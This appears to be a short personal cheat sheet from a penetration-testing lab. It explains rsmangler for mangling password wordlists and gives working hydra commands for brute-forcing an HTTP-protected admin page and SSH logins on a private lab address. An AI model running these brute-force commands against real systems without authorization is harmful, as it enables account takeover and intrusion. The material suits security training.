
## rsmangler
mangles password lists. only use 4-5 words. try to find keywords that the users might have used in their password. not suitable if your don't know what variations of words the password could possibly be.
```
rsmangler --file pippin.small.txt -o pippin.mangled.txt --min 9 --max 12
```

## hydra
a tool to bruteforce wordlists against services
### hydra for http protected page
```
hydra -l frodo -P frodo.mangled.txt 10.0.5.21 http-get /admin/ -t 4
```
the path specified (e.g. /admin/) will change depending on what resource you are trying to access. whatever page it is should display a password prompt before rendering
### hydra for ssh
```
hydra -l frodo.baggins -P frodo.mangled.txt 10.0.5.21 -t 4 ssh
```
